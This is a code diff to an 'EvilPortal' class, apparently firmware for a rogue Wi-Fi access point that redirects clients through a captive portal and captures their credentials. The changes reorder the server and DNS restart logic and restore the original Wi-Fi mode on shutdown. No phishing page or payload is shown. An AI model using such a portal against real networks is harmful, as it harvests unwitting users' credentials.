@@ -243,25 +243,21 @@ void EvilPortal::setupRoutes() {
 }
 
 void EvilPortal::restartWiFi(bool reset) {
-    // Stop server safely - let it clean up handlers
+    // Let server handle cleanup - just stop and restart
     webServer.end();
     dnsServer.stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
     
-    // Handler is now gone, just nullify the pointer
+    // Don't touch _captiveHandler - server owns it
     _captiveHandler = nullptr;
     
-    // Restart AP with current settings
     wifiDisconnect();
     WiFi.softAP(apName, emptyString, _channel);
     vTaskDelay(100 / portTICK_PERIOD_MS);
     
-    // Restart services
-    setupRoutes();
+    setupRoutes();  // This will create a new handler
     dnsServer.start(53, "*", WiFi.softAPIP());
     webServer.begin();
-    
-    // Handler is created in setupRoutes(), no need to do it again
     
     if (reset) resetCapturedCredentials();
 }
@@ -327,6 +323,10 @@ void EvilPortal::loop() {
                 
                 // Stop DNS
                 dnsServer.stop();
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                // Restore original WiFi mode
+                WiFi.mode(_originalWifiMode);
                 vTaskDelay(100 / portTICK_PERIOD_MS);
                 
                 // Stop wifi else it will stay on but not connected to any AP
